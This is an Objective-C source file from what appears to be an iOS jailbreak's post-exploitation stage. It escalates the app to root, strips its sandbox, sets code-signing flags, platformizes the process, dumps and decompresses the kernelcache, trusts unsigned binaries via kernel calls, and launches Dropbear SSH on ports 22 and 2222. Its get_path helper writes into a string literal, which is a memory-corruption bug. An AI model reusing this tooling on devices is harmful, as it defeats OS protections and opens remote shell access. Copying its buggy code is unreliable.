//
//  postexp.m
//  sefebreak
//
//  Created by Xavier Perarnau on 04/02/2019.
//  Copyright © 2019 Xavier Perarnau. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <CommonCrypto/CommonDigest.h>
#import <UIKit/UIKit.h>
#import <unistd.h>
#import <sys/stat.h>
#import <sys/utsname.h>

#include "kernel_memory.h"
#include "kernel_call.h"
#include "parameters.h"
#include "kernel_slide.h"
#include "postexp.h"
#include "offsets.h"
#include "root.h"
#include "sandbox.h"
#include "log.h"
#include "post-common.h"
#include "launch_utils.h"

#include "patchfinder64.h"
#include "macho-helper.h"
#include "lzssdec.hpp"
#include "untar.h"
#include "amfi_utils.h"

#define fileExists(file) [[NSFileManager defaultManager] fileExistsAtPath:@(file)]

#define removeFile(file) if (fileExists(file)) {\
[[NSFileManager defaultManager]  removeItemAtPath:@(file) error:&error]; \
if (error) { \
ERROR("error removing file %s (%s)", file, [[error localizedDescription] UTF8String]); \
} else {\
INFO("deleted old copy from %s", file);\
}\
}

#define copyFile(copyFrom, copyTo) [[NSFileManager defaultManager] copyItemAtPath:@(copyFrom) toPath:@(copyTo) error:&error]; \
INFO("copying %s to %s", copyFrom, copyTo);\
if (error) { \
ERROR("error copying item %s to path %s (%s)", copyFrom, copyTo, [[error localizedDescription] UTF8String]); \
}

#define moveFile(copyFrom, moveTo) [[NSFileManager defaultManager] moveItemAtPath:@(copyFrom) toPath:@(moveTo) error:&error]; \
if (error) {\
ERROR("error moving item %s to path %s (%s)", copyFrom, moveTo, [[error localizedDescription] UTF8String]); \
}

const char *binPath = "/var/containers/Bundle/iosbinpack64";
const char *kernel_path = "/System/Library/Caches/com.apple.kernelcaches/kernelcache";

char *get_path(char *path) {
    char *res = "";
    strcpy(res, (char *)binPath);
    strcat(res, path);
    return res;
}

enum post_exp_t root_and_escape(void) {
    // Initialize offsets
    _offsets_init();
    
    // Get r00t
    save_proc_user_struct(current_task);
    INFO("current UID: %d", getuid());
    root(current_task);
    uid_t current_uid = getuid();
    if(current_uid != 0) {
        ERROR("couldn't get r00t");
        return ERROR_GETTING_ROOT;
    } else {
        INFO("current UID: %d", getuid());
    }
    
    // Unsandbox
    save_proc_sandbox_struct(current_task);
    unsandbox(current_task);
    
    setcsflags(current_task);
    platformize(current_task);
    INFO("the application is now a platform binary");
    
    return NO_ERROR;
}

enum post_exp_t get_kernel_file(void) {
    NSString *docs = [[[[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask] lastObject] path];
    mkdir((char *)[docs UTF8String], 0777);
    
    NSString *newPath = [docs stringByAppendingPathComponent:[NSString stringWithFormat:@"kernelcache.dump"]];
    const char *location = [newPath UTF8String];
    NSError *error = NULL;
        
    removeFile(location);
    error = NULL;
    copyFile(kernel_path, location);
    if (error) {
        return ERROR_ESCAPING_SANDBOX;
    }
    chown(location, 501, 501);
    return NO_ERROR;
}

enum post_exp_t initialize_patchfinder64() {
    NSString *docs = [[[[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask] lastObject] path];
    const char *original_kernel_cache_path = [[docs stringByAppendingPathComponent:[NSString stringWithFormat:@"kernelcache.dump"]] UTF8String];
    const char *decompressed_kernel_cache_path = [[docs stringByAppendingPathComponent:[NSString stringWithFormat:@"kernelcache.dec"]] UTF8String];
    
    NSError *error = NULL;
    removeFile(decompressed_kernel_cache_path);
    
    FILE *original_kernel_cache = fopen(original_kernel_cache_path, "rb");
    uint32_t macho_header_offset = find_macho_header(original_kernel_cache);
    char *args[5] = { "lzssdec", "-o", (char *)[NSString stringWithFormat:@"0x%x", macho_header_offset].UTF8String, (char *)original_kernel_cache_path, (char *)decompressed_kernel_cache_path};
    lzssdec(5, args);
    fclose(original_kernel_cache);
    chown(decompressed_kernel_cache_path, 501, 501);
    
    if (init_kernel(NULL, 0, decompressed_kernel_cache_path) != ERR_SUCCESS) {
        ERROR("failed to initialize patchfinder");
        return ERROR_SETTING_PATCHFINDER64;
    } else {
        INFO("patchfinder initialized successfully");
        return NO_ERROR;
    }
}

enum post_exp_t bootstrap() {
    NSError *error = NULL;
    removeFile(binPath);

    mkdir(binPath, 0777);
    INFO("installing ios binary pack...");
    
    chdir("/var/containers/Bundle/");
    FILE *bootstrap = fopen([[[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"iosbinpack.tar"] UTF8String], "r");
    untar(bootstrap, "/var/containers/Bundle/");
    fclose(bootstrap);
    
    removeFile(get_path("/usr/local/bin/dropbear"));
    removeFile(get_path("/usr/bin/scp"));
    
    chdir("/var/containers/Bundle/");
    FILE *fixed_dropbear = fopen([[[[NSBundle mainBundle] bundlePath] stringByAppendingPathComponent:@"dropbear.v2018.76.tar"] UTF8String], "r");
    untar(fixed_dropbear, "/var/containers/Bundle/");
    fclose(fixed_dropbear);
    INFO("installed Dropbear SSH!");

    kernel_call_init();
    trustbin(binPath, STATIC_ADDRESS(kernel_base) + kernel_slide);
    kernel_call_deinit();
    
    mkdir("/var/dropbear", 0777);
    removeFile("/var/profile");
    removeFile("/var/motd");
    chmod("/var/profile", 0777);
    
    copyFile(get_path("/etc/profile"), "/var/profile");
    copyFile(get_path("/etc/motd"), "/var/motd");
    FILE *motd = fopen("/var/motd", "w");
    struct utsname ut;
    uname(&ut);
    fprintf(motd, "A12 dropbear exec by @xavo95\n");
    fprintf(motd, "%s %s %s %s %s\n", ut.sysname, ut.nodename, ut.release, ut.version, ut.machine);
    fclose(motd);
    chmod("/var/motd", 0777);
    
    launch(get_path("/usr/bin/killall"), "-SEGV", "dropbear", NULL, NULL, NULL, NULL, NULL);
    launchAsPlatform(get_path("/usr/local/bin/dropbear"), "-R", "-E", "-p", "22", "-p", "2222", NULL);
    
    return NO_ERROR;
}

void cleanup(void) {
    term_kernel();
    restore_csflags(current_task);
    sandbox(current_task);
    unroot(current_task);
}
